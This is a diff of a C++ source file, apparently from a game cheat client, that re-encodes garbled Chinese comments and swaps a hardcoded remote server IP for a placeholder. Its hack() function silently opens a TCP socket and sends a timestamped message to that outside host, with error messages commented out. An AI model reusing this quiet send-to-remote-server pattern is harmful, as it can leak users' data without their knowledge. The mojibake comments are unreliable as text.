@@ -28,11 +28,10 @@
 
 #include <winsock2.h>  
 #include <stdio.h>  
-#pragma comment(lib,"ws2_32.lib")	//°Ñws2_32.lib¼Óµ½LinkÒ³µÄÁ¬½Ó¿â  
-//#define IP "172.18.68.243"			//ÔÚÁ½Ì¨¼ÆËã»úÉÏ²âÊÔ£¬IPÎªServer¶ËµÄIPµØÖ·  
-#define IP "8.138.98.234"				//ÔÚÒ»Ì¨¼ÆËã»úÉÏ²âÊÔ£¬IPÎª±¾µØ»ØËÍµØÖ·
-#define PORT 19132					//×¢Òâ£º¿Í»§¶ËÉèÖÃÍ¨ĞÅµÄ¶Ë¿Ú = ·şÎñ¶ËµÄ¶Ë¿Ú
-#define BUFFER_SIZE 1024			//Êı¾İ·¢ËÍ»º³åÇø´óĞ¡
+#pragma comment(lib,"ws2_32.lib")	//æŠŠws2_32.libåŠ åˆ°Linké¡µçš„è¿æ¥åº“  
+#define IP "114.114.114.114"				//change this to your own server ip æ”¹æˆä½ è‡ªå·±æœåŠ¡å™¨çš„ip
+#define PORT 19132					//æ³¨æ„ï¼šå®¢æˆ·ç«¯è®¾ç½®é€šä¿¡çš„ç«¯å£ = æœåŠ¡ç«¯çš„ç«¯å£
+#define BUFFER_SIZE 1024			//æ•°æ®å‘é€ç¼“å†²åŒºå¤§å°
 
 
 using namespace std;
@@ -64,11 +63,11 @@ void hack() {
 
 	auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
 
-	//×ªÎª×Ö·û´®
+	//è½¬ä¸ºå­—ç¬¦ä¸²
 	std::stringstream ss;
-	// ¿ÉÒÔ·Ö±ğÒÔ²»Í¬µÄĞÎÊ½½øĞĞÏÔÊ¾
+	// å¯ä»¥åˆ†åˆ«ä»¥ä¸åŒçš„å½¢å¼è¿›è¡Œæ˜¾ç¤º
 	ss << std::put_time(std::localtime(&t), "%Y-%m-%d- %H:%M:%S > ");
-	//ss << std::put_time(std::localtime(&t), "%YÄê%mÔÂ%dÈÕ%HÊ±%M·Ö%SÃë");
+	//ss << std::put_time(std::localtime(&t), "%Yå¹´%mæœˆ%dæ—¥%Hæ—¶%Måˆ†%Sç§’");
 	//	ss << std::put_time(std::localtime(&t), "%Y%m%d%H%M%S");
 
 	std::string str_time = ss.str();
@@ -86,37 +85,37 @@ void hack() {
 			buf[i] = message[i];
 		buf[i] = '\0';
 		printf("%s\n", buf);
-		cout << buf;						//bufÊı×é´æ·Å¿Í»§¶Ë·¢ËÍµÄÏûÏ¢  
+		cout << buf;						//bufæ•°ç»„å­˜æ”¾å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯  
 
 
 	WSADATA WSAData;
-	if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)  //WSAStartup()º¯Êı¶ÔWinsock DLL½øĞĞ³õÊ¼»¯
+	if (WSAStartup(MAKEWORD(2, 0), &WSAData) == SOCKET_ERROR)  //WSAStartup()å‡½æ•°å¯¹Winsock DLLè¿›è¡Œåˆå§‹åŒ–
 	{
 		//printf("Socket initialize fail!\n");
 		return;
 	}
-	SOCKET sock;											//¿Í»§¶Ë½ø³Ì´´½¨Ì×½Ó×Ö
-	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)  //´´½¨Á÷Ì×½Ó×Ö£¨Óë·şÎñ¶Ë±£³ÖÒ»ÖÂ£©
+	SOCKET sock;											//å®¢æˆ·ç«¯è¿›ç¨‹åˆ›å»ºå¥—æ¥å­—
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)  //åˆ›å»ºæµå¥—æ¥å­—ï¼ˆä¸æœåŠ¡ç«¯ä¿æŒä¸€è‡´ï¼‰
 	{
 		//printf("Socket create fail!\n");
 		WSACleanup();
 		return;
 	}
 
-	struct sockaddr_in ClientAddr;				//sockaddr_in½á¹¹ÓÃÀ´±êÊ¶TCP/IPĞ­ÒéÏÂµÄµØÖ·£¬¿ÉÇ¿ÖÆ×ª»»Îªsockaddr½á¹¹
-	ClientAddr.sin_family = AF_INET;				//Ö¸InternetÓò
-	ClientAddr.sin_port = htons(PORT);			//Ö¸¶¨·şÎñ¶ËËùÔ¤ÁôµÄ¶Ë¿Ú
-	ClientAddr.sin_addr.s_addr = inet_addr(IP);	//Ö¸¶¨·şÎñ¶ËËù°ó¶¨µÄIPµØÖ·
-	if (connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)  //µ÷ÓÃconnect()º¯Êı£¬Ïò·şÎñÆ÷½ø³Ì·¢³öÁ¬½ÓÇëÇó  
+	struct sockaddr_in ClientAddr;				//sockaddr_inç»“æ„ç”¨æ¥æ ‡è¯†TCP/IPåè®®ä¸‹çš„åœ°å€ï¼Œå¯å¼ºåˆ¶è½¬æ¢ä¸ºsockaddrç»“æ„
+	ClientAddr.sin_family = AF_INET;				//æŒ‡InternetåŸŸ
+	ClientAddr.sin_port = htons(PORT);			//æŒ‡å®šæœåŠ¡ç«¯æ‰€é¢„ç•™çš„ç«¯å£
+	ClientAddr.sin_addr.s_addr = inet_addr(IP);	//æŒ‡å®šæœåŠ¡ç«¯æ‰€ç»‘å®šçš„IPåœ°å€
+	if (connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)  //è°ƒç”¨connect()å‡½æ•°ï¼Œå‘æœåŠ¡å™¨è¿›ç¨‹å‘å‡ºè¿æ¥è¯·æ±‚  
 	{
 		//printf("Connect fail!\n");
 		closesocket(sock);
 		WSACleanup();
 		return;
 	}
-	send(sock, buf, 1024, 0);				 //Ïò·şÎñÆ÷·¢ËÍÊı¾İ 
-	closesocket(sock);							 //¹Ø±ÕÌ×½Ó×Ö
-	WSACleanup();								//ÖÕÖ¹¶ÔWinsock DLLµÄÊ¹ÓÃ£¬²¢ÊÍ·Å×ÊÔ´£¬ÒÔ±¸ÏÂÒ»´ÎÊ¹ÓÃ
+	send(sock, buf, 1024, 0);				 //å‘æœåŠ¡å™¨å‘é€æ•°æ® 
+	closesocket(sock);							 //å…³é—­å¥—æ¥å­—
+	WSACleanup();								//ç»ˆæ­¢å¯¹Winsock DLLçš„ä½¿ç”¨ï¼Œå¹¶é‡Šæ”¾èµ„æºï¼Œä»¥å¤‡ä¸‹ä¸€æ¬¡ä½¿ç”¨
 }
 
 static vector<C_Entity*> targetList;
